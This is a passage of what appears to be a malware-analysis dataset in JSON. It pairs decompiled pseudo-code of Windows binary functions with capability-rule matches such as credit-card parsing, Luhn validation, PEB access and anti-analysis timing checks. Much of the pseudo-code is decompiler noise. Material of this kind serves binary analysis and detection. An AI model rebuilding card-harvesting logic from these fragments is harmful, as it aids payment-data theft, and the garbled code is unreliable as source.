0;\n        uVar16 = *puVar6 == 0;\n    }\n    fcn.00403600(0x411154, 10, 0x4242a0, 0xb);\n    fcn.00403600(0x411154, 10, 0x4242ac, 0xb);\n    fcn.00403600(0x411154, 10, 0x4242b8, 0xb);\n    iVar4 = fcn.00403600(0x411154, 10, 0x4242c4, 10);\n    bVar15 = false;\n    bVar17 = ((puVar12 | 0x74e3) - iVar4 & 0x1a8) == 0;\n    uVar14 = 0x40;\n    uVar16 = 0;\n    fcn.00403600(0x411154, 10, 0x4242d0, 0xc);\n    if ((bVar15 || bVar17) || (!bVar15 && !bVar17)) {\n        in_CS = 0xe;\n        uVar14 = 0;\n        uVar16 = 0;\n    }\n    else {\n        *(puVar12 + 0x6a) = *(puVar12 + 0x6a) - &stack0xffffa17a;\n    }\n    fcn.00403600(0x411154, 10, 0x4242dc, CONCAT13(uVar16, CONCAT12(uVar14, in_CS)));\n    fcn.00403600(0x411154, 10, 0x4242ec, 0x11);\n    fcn.00403600(0x411154, 10, 0x424300, 0x13);\n    bVar15 = SBORROW1(extraout_DH_00, '6');\n    fcn.00403600(0x411154, 10, 0x424314, 0x14);\n    if ((!bVar15) && (bVar15)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00403600(0x411154, 10, 0x424328, 0x33);\n    bVar15 = false;\n    uVar14 = 0;\n    Var22 = 0x411154;\n    fcn.00403600(0x411154, 10, 0x42435c, 10);\n    if ((!bVar15) && (bVar15)) {\n        *CONCAT13(uVar14, Var22) = uStack24170;\n        return;\n    }\n    uVar16 = 0;\n    Var22 = 0x424368;\n    uVar14 = 0;\n    uVar5 = 0xa00;\n    fcn.00403600(0x411154, 10, 0x424368, 4);\n    fcn.00403600(0x411154, 10, 0x42436c, 5);\n    uVar13 = 0;\n    bVar15 = (POPCOUNT((unaff_EBX | extraout_AH) & 0x94f) & 1U) == 0;\n    uVar23 = 0x2629;\n    uVar20 = fcn.00403600(0x411154, 10, 0x424374, 6);\n    pcVar9 = uVar20 >> 0x20;\n    iVar21 = uVar20;\n    if (!bVar15) {\n        uVar24 = uVar26;\n        uVar25 = uVar26 >> 8;\n        if (bVar15) {\n            out(*(uVar26 & 0xffff0000 | uVar26 & 0xff | uVar25 << 8), uVar20 >> 0x20);\n            uVar13 = in_AF;\n            do {\n                cVar18 = iVar21 >> 8;\n                uVar13 = 9 < (iVar21 & 0xf) | uVar13;\n                iVar21 = CONCAT31(CONCAT21(iVar21 >> 0x10, cVar18 - uVar13), -uVar13);\n            } while (uVar13 || cVar18 == *pcVar9);\n            goto code_r0x0040263a;\n        }\n    }\n    uVar23 = 0x2a;\n    uVar24 = 0;\n    uVar25 = 0;\n    uVar16 = 0;\n    uVar5 = 0xa00;\n    Var22 = 0x4243a8;\n    uVar14 = 0;\ncode_r0x0040263a:\n    piVar8 = puVar12 + pcVar9 * 2;\n    *piVar8 = (*piVar8 + 0x7b) - uVar13;\n    *(extraout_ECX_06 + 0x6a) = iVar21;\n    pcVar9[0xb] = pcVar9[0xb] + ((extraout_ECX_06 >> 8) - *(iVar21 + -0x58));\n    fcn.00403600(0x411154, CONCAT13(uVar14, uVar5 >> 8), CONCAT13(uVar16, Var22), \n                 CONCAT13(uVar25, CONCAT12(uVar24, uVar23)));\n    fcn.00403600(0x411154, 10, 0x4243d4, 0xb);\n    return;\n}\n",
        "token_count": 4808
    },
    "00402a50": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cbf) overlaps instruction at (ram,0x00402cbe)\n// \n\nvoid fcn.00402a50(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    uint32_t uVar5;\n    int32_t unaff_EBX;\n    uint *puVar6;\n    uint *unaff_EBP;\n    uint32_t unaff_EDI;\n    uint8_t *puVar7;\n    uchar uVar8;\n    uint8_t in_AF;\n    bool bVar9;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar uVar10;\n    uchar uVar11;\n    \n    fcn.00403600(0x411154, 10, 0x4244dc, 0x20);\n    fcn.00403600(0x411154, 10, 0x4244fc, 0x26);\n    fcn.00403600(0x411154, 10, 0x424524, 8);\n    fcn.00403600(0x411154, 10, 0x42452c, 0x19);\n    fcn.00403600(0x411154, 10, 0x424548, 0xb);\n    fcn.00403600(0x411154, 10, 0x424554, 0x12);\n    fcn.00403600(0x411154, 10, 0x424568, 0x12);\n    fcn.00403600(0x411154, 10, 0x42457c, 2);\n    iVar4 = fcn.00403600(0x411154, 10, 0x424580, 8);\n    uVar8 = 0;\n    bVar9 = (iVar4 + unaff_EBX | 0x11a9U) == 0;\n    uVar10 = 0x88;\n    uVar11 = 0x45;\n    fcn.00403600(0x411154, 10, 0x424588, 8);\n    if ((!bVar9) && (bVar9)) {\n        puVar6 = &stack0xffffffe3;\n        cVar2 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *unaff_EBP;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    uVar5 = fcn.00403600(0x411154, 10, 0x424590, 6);\n    if ((!bVar9) && (bVar9)) {\n        if (uVar8 || unaff_EBX + 1 == 0) goto code_r0x00402c76;\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        piVar1 = (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n    }\n    fcn.00403600(0x411154, 10, 0x424598, 7);\n    fcn.00403600(0x411154, 10, 0x4245a0, 7);\n    uVar10 = unaff_EDI & 0xffff;\n    uVar11 = (unaff_EDI & 0xffff) >> 8;\ncode_r0x00402c76:\n    uVar3 = fcn.00403600(0x411154, 10, 0x4245a8, 6);\n    puVar7 = unaff_EDI & 0xffff0000 | CONCAT11(uVar11, uVar10);\n    cVar2 = uVar3 - *puVar7;\n    uVar5 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *puVar7) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar2) & 1U) == 0) * 4 |\n            uVar3 < *puVar7 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n            (in_AC & 1) * 0x40000;\n    func_0x10188c31();\n    fcn.00403600(0x411154, 10, 0x4245b0, uVar5);\n    fcn.00403600(0x411154, 10, 0x4245d8, 8);\n    return;\n}\n",
        "token_count": 1228
    },
    "00402d10": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d27) overlaps instruction at (ram,0x00402d26)\n// \n// WARNING: Removing unreachable block (ram,0x00402dd0)\n// WARNING: Removing unreachable block (ram,0x00402df1)\n// WARNING: Removing unreachable block (ram,0x00402df3)\n// WARNING: Removing unreachable block (ram,0x00402e09)\n// WARNING: Removing unreachable block (ram,0x00402e0b)\n// WARNING: Removing unreachable block (ram,0x00402e9a)\n// WARNING: Removing unreachable block (ram,0x00402ea1)\n// WARNING: Removing unreachable block (ram,0x00402ea3)\n// WARNING: Removing unreachable block (ram,0x00402eac)\n// WARNING: Removing unreachable block (ram,0x00402eb0)\n// WARNING: Removing unreachable block (ram,0x00402ebd)\n// WARNING: Removing unreachable block (ram,0x00402ed8)\n// WARNING: Removing unreachable block (ram,0x00402edf)\n// WARNING: Removing unreachable block (ram,0x00402f3d)\n// WARNING: Removing unreachable block (ram,0x00402f4f)\n// WARNING: Removing unreachable block (ram,0x00402f95)\n// WARNING: Removing unreachable block (ram,0x00402f36)\n// WARNING: Removing unreachable block (ram,0x00402f54)\n// WARNING: Removing unreachable block (ram,0x00402f68)\n// WARNING: Removing unreachable block (ram,0x00402f83)\n// WARNING: Removing unreachable block (ram,0x00402f8c)\n// WARNING: Removing unreachable block (ram,0x00402f98)\n// WARNING: Removing unreachable block (ram,0x00402fd1)\n// WARNING: Removing unreachable block (ram,0x00402fcd)\n// WARNING: Removing unreachable block (ram,0x00402fd4)\n// WARNING: Removing unreachable block (ram,0x00402fda)\n// WARNING: Removing unreachable block (ram,0x00402fe6)\n// WARNING: Removing unreachable block (ram,0x00402fef)\n// WARNING: Removing unreachable block (ram,0x00402f7f)\n// WARNING: Removing unreachable block (ram,0x00402ff1)\n// WARNING: Removing unreachable block (ram,0x00402ff8)\n// WARNING: Removing unreachable block (ram,0x00402ffc)\n// WARNING: Removing unreachable block (ram,0x00403009)\n// WARNING: Removing unreachable block (ram,0x0040300e)\n// WARNING: Removing unreachable block (ram,0x00403019)\n// WARNING: Removing unreachable block (ram,0x00403020)\n// WARNING: Removing unreachable block (ram,0x00403030)\n// WARNING: Removing unreachable block (ram,0x0040303f)\n// WARNING: Removing unreachable block (ram,0x0040306c)\n// WARNING: Removing unreachable block (ram,0x00403076)\n// WARNING: Removing unreachable block (ram,0x004030a9)\n// WARNING: Removing unreachable block (ram,0x004030af)\n// WARNING: Removing unreachable block (ram,0x004030b0)\n// WARNING: Removing unreachable block (ram,0x004030b8)\n// WARNING: Removing unreachable block (ram,0x004030be)\n// WARNING: Removing unreachable block (ram,0x004030cb)\n\nint32_t fcn.00402d10(uint32_t param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    uint16_t *puVar7;\n    int32_t iVar8;\n    ushort in_SS;\n    bool bVar9;\n    \n    puVar6 = &stack0xfffffffc;\ncode_r0x00402d2b:\n    iVar8 = *(puVar6 + 0x10);\n    puVar7 = *(puVar6 + 0xc);\n    uVar4 = param_1;\n    do {\n        param_1 = uVar5;\n        if (iVar8 == 0) {\n            return (uVar4 >> 0x10) + uVar4;\n        }\n        param_1 = param_1 + *puVar7;\n        uVar4 = param_1 >> 0x10;\n        uVar3 = param_1 >> 0x10;\n        bVar9 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n        if (uVar3 != 0) {\n            if ((!bVar9) && (bVar9)) {\n                piVar2 = segment(in_SS, *0x10 + -0x10);\n                if (bVar9) break;\n                uVar4 = *piVar2;\n            }\n            param_1 = (uVar4 & 0xffff) + (param_1 & 0xffff);\n        }\n        uVar5 = param_1;\n        puVar7 = puVar7 + 1;\n        iVar8 = iVar8 + -1;\n        uVar4 = uVar5;\n    } while( true );\n    puVar6 = puVar6 + -1;\n    puVar1 = *piVar2 + 0x52;\n    *puVar1 = *puVar1 | 0xa5;\n    goto code_r0x00402d2b;\n}\n",
        "token_count": 1218
    },
    "00404660": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040478b) overlaps instruction at (ram,0x00404788)\n// \n\nuint32_t __cdecl fcn.00404660(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    bool bVar7;\n    ulong uVar8;\n    \n    uVar1 = fcn.00402d10(0, arg_8h, arg_ch + 1U >> 1);\n    piVar6 = uVar1 & 0xffff;\n    uVar8 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(arg_8h);\n    uVar1 = uVar8 >> 0x20;\n    uVar3 = uVar8;\n    piVar4 = (uVar1 >> 8 & 0xffff00) << 8 | uVar1 & 0xffff;\n    uVar1 = *(uVar3 + 0x58);\n    bVar7 = SBORROW2(piVar6, uVar1);\n    if (piVar6 < uVar1) {\n        if ((bVar7) || (!bVar7)) {\n            piVar6 = piVar6 - uVar1;\n        }\n        uVar1 = CONCAT31(uVar1 >> 8, 0x98);\n        uVar3 = 0xf82b5d21;\n        bVar7 = false;\n        iVar5 = (piVar6 & 0xffff) - 1;\n    }\n    else {\n        piVar4 = uVar1 & 0xffff;\n        bVar7 = piVar6 < piVar4;\n        iVar5 = piVar6 - piVar4;\n    }\n    if ((!bVar7) && (bVar7)) {\n        out(0xbd, uVar1);\n        return uVar1;\n    }\n    uVar2 = uVar1 >> 0x10;\n    if (iVar5 < uVar1 >> 0x10) {\n        uVar1 = iVar5 - uVar2 & 0xffff;\n        bVar7 = SBORROW4(uVar1, 1);\n        iVar5 = uVar1 - 1;\n    }\n    else {\n        bVar7 = SBORROW4(iVar5, uVar2);\n        iVar5 = iVar5 - uVar2;\n    }\n    if ((bVar7) || (!bVar7)) {\n        iVar5 = iVar5 + arg_ch;\n    }\n    else {\n        uVar3 = 0x458b5d21;\n        arg_14h = piVar4;\n    }\n    *arg_14h = iVar5;\n    *arg_10h = *(uVar3 + 0x58);\n    return uVar3;\n}\n",
        "token_count": 655
    },
    "00403b10": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b54) overlaps instruction at (ram,0x00403b50)\n// \n// WARNING: Removing unreachable block (ram,0x00403b40)\n// WARNING: Removing unreachable block (ram,0x00403b4a)\n\nbool fcn.00403b10(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    uStack8 = 0x104;\n    puVar3 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4245b0, 0x4245d8, auStack12, &uStack272, &uStack8);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&uStack272, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&uStack272);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 391
    },
    "00404310": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004043ba)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404310(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar lpCommandLine;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint lParam;\n    uint var_4h;\n    \n    fcn.00402a50();\n    iVar3 = fcn.00403b10();\n    if (iVar3 != 0) {\n        lpszPath = 0;\n        puVar4 = &var_25fh;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &lpszPath, 0x26, 0);\n        if (iVar3 != 0) {\n            fcn.00403160();\n            lpCommandLine = 0;\n            puVar4 = &var_15bh;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&lpCommandLine, 0x4244fc, &lpszPath, 0x4244dc, 3);\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar4 = &var_58h;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                hProcess = 0;\n                var_58h = 0x44;\n                var_ch = 0;\n                var_2ch = 1;\n                lParam = 0;\n                var_28h._0_2_ = 0;\n                var_4h = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, &lpCommandLine, 0, 0, 0, 0, 0, 0, &var_58h, &hProcess);\n                if (iVar3 == 0) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                (*_sym.imp.USER32.dll_EnumWindows)(fcn.004041f0, lParam);\n                iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar3 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar1)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 833
    },
    "00404550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404550(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401390;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x411150;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 216
    },
    "00404ca0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404da0) overlaps instruction at (ram,0x00404d9b)\n// \n\nuint fcn.00404ca0(uint param_1, uint *param_2, uint param_3, uint param_4, uint param_5, uchar *param_6)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    char cVar10;\n    uint32_t uVar9;\n    uint *puVar11;\n    uint *arg_14h;\n    uint32_t uVar12;\n    uint *unaff_EDI;\n    uint *puVar13;\n    bool bVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint32_t arg_20h;\n    uchar uStack36;\n    uint auStack35 [7];\n    \n    arg_14h = &stack0xfffffffc;\n    uVar16 = fcn.00401660(param_5, param_6, 0x4241a4, 7);\n    uVar9 = uVar16 >> 0x20;\n    puVar11 = uVar16;\n    if (puVar11 == NULL) {\n        return 0;\n    }\n    if ((puVar11 < 1) || (0 < puVar11)) {\n        puVar6 = NULL;\n        uStack36 = 0;\n        puVar7 = &uStack36 + 1;\n        for (iVar8 = 7; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    else {\n        *puVar11 = *puVar11 + uVar16;\n        cVar10 = uVar16 >> 0x28;\n        *puVar11 = *puVar11 + cVar10;\n        puVar7 = unaff_EDI + 1;\n        *unaff_EDI = puVar11;\n        puVar6 = puVar11;\n        puVar11 = puVar11 & 0xffffff00 | uVar16 + cVar10;\n    }\n    *puVar7 = puVar6;\n    *(puVar7 + 2) = puVar6;\n    uVar12 = 0;\n    do {\n        arg_20h = uVar9 & 0xffff | puVar6 << 0x10;\n        uVar16 = (*_sym.imp.MSVCRT.dll_rand)();\n        uVar9 = uVar16 >> 0x20;\n        puVar6 = uVar16 & 0x800000ff;\n        if (puVar6 < 0) {\n            puVar6 = (puVar6 - 1U | 0xffffff00) + 1;\n        }\n        (&uStack36)[uVar12] = puVar6;\n        bVar14 = uVar12 + 1 < 0x20;\n        uVar2 = uVar12 - 0x1f;\n        bVar15 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        uVar12 = uVar12 + 1;\n    } while (bVar14);\n    puVar7 = puVar6;\n    if ((!bVar14 && uVar2 != 0) && (bVar14 || uVar2 == 0)) {\n        puVar7 = puVar6 & 0xe2f4cc58;\n        bVar15 = (POPCOUNT(puVar6 & 0x58) & 1U) == 0;\n    }\n    puVar6 = &uStack36;\n    puVar13 = puVar11;\n    for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n        *puVar13 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    if ((bVar15) || (!bVar15)) {\n        param_6 = &uStack36;\n        arg_20h = 0x20;\n    }\n    else {\n        arg_14h = *0x8b17b43a;\n        pcVar1 = puVar11 + -0x73;\n        *pcVar1 = *pcVar1 + puVar7 + (0x74 < (uVar16 >> 0x20) + 1U);\n        param_3 = 0xffffffff;\n        param_2 = puVar7;\n        param_4 = param_5;\n        puVar11 = arg_14h;\n        if (*pcVar1 != '\\0') {\n            iVar8 = fcn.00401cf0(0x34a96cf4);\n            pcVar5 = _sym.imp.USER32.dll_GetMessageA;\n            if (iVar8 != 0) {\n                iVar8 = (*_sym.imp.USER32.dll_GetMessageA)(arg_14h + -7, 0, 0, 0);\n                pcVar4 = _sym.imp.USER32.dll_TranslateMessage;\n                pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n                while (iVar8 != 0) {\n                    (*pcVar4)(arg_14h + -7);\n                    (*pcVar3)();\n                    (*_sym.imp.USER32.dll_DispatchMessageA)(arg_14h + -7);\n                    iVar8 = (*pcVar5)(arg_14h + -7, 0, 0, 0);\n                }\n            }\n            return 0;\n        }\n    }\n    *(param_2 + -0x75) = *(param_2 + -0x75) & param_2;\n    fcn.00401ae0(arg_14h[2], param_2, param_3, arg_14h, param_4, param_6, arg_20h);\n    fcn.00403890(arg_14h[6], arg_14h[7], puVar11);\n    return 1;\n}\n",
        "token_count": 1355
    },
    "00401000": {
        "rules": [
            "create or open file",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401035) overlaps instruction at (ram,0x00401031)\n// \n\nuint fcn.00401000(uint param_1, int32_t param_2, uint param_3, uint param_4)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    ulong uVar7;\n    \n    // [00] -r-x section size 20480 named .text\n    uVar7 = (*_sym.imp.MSVCRT.dll_fopen)(param_1, param_2);\n    iVar4 = uVar7;\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if ((iVar4 < 0) || (iVar4 >= 0)) {\n        param_2 = iVar4;\n        uVar7 = CONCAT44(param_4, param_3);\n    }\n    puVar6 = uVar7 >> 0x20;\n    *(uVar7 + -0x7ce92414) = extraout_ST0;\n    uVar5 = uVar7 - 1;\n    uVar3 = uVar5;\n    in_AF = 9 < (uVar3 & 0xf) | in_AF;\n    uVar3 = uVar3 + in_AF * '\\x06';\n    uVar3 = uVar3 + (0x90 < (uVar3 & 0xf0) | in_AF * (0xf9 < uVar3)) * '`';\n    uVar1 = *puVar6;\n    *puVar6 = *puVar6 + 0x558bdf84;\n    uVar2 = uVar3 + 0x8b;\n    *(iVar4 + 0x52) = *(iVar4 + 0x52) + (uVar7 >> 0x20) + (0x74 < uVar3 || CARRY1(uVar2, 0xaa74207b < uVar1));\n    (*_sym.imp.MSVCRT.dll_fwrite)(uVar5 & 0xffffff00 | uVar2 + (0xaa74207b < uVar1), 1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar4);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar4, param_2);\n    return 1;\n}\n",
        "token_count": 556
    },
    "00401700": {
        "rules": [
            "create or open file",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401700(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401172) overlaps instruction at (ram,0x0040116f)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401080(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint var_20fh;\n    uint s;\n    uint var_8h;\n    uint var_4h;\n    \n    s._0_1_ = 0;\n    puVar2 = &fcn.00401080::var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &fcn.00401080::s + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    fcn.004033f0(&fcn.00401080::var_4h, &fcn.00401080::var_8h);\n    fcn.00401190();\n    iVar1 = fcn.004039d0();\n    bVar3 = iVar1 == 0;\n    if (!bVar3) {\n        if ((!bVar3) && (bVar3)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        fcn.004049f0();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 447
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004013b9) overlaps instruction at (ram,0x004013b7)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401390(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint8_t uVar4;\n    int32_t extraout_ECX;\n    ushort extraout_DX;\n    uint16_t unaff_BX;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    \n    if (arg_ch == 1) {\n        fcn.004020e0();\n        while( true ) {\n            iVar1 = fcn.00401e90();\n            iVar1 = extraout_ECX - iVar1;\n            uVar3 = iVar1 & 0xff00 | iVar1 ^ iVar1 >> 8 | 0x3d00 | unaff_BX;\n            uVar2 = uVar3;\n            uVar4 = uVar3 >> 8;\n            bVar5 = uVar4 < uVar2;\n            bVar7 = SBORROW1(uVar4, uVar2);\n            bVar6 = uVar4 == uVar2;\n            fcn.00404310();\n            if ((bVar5 || bVar6) || (!bVar5 && !bVar6)) break;\n            if (!bVar7) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            in(extraout_DX);\n        }\n        if (*0x4245e8 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.004047e0();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 456
    },
    "00401630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401630(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004036b0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00401660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
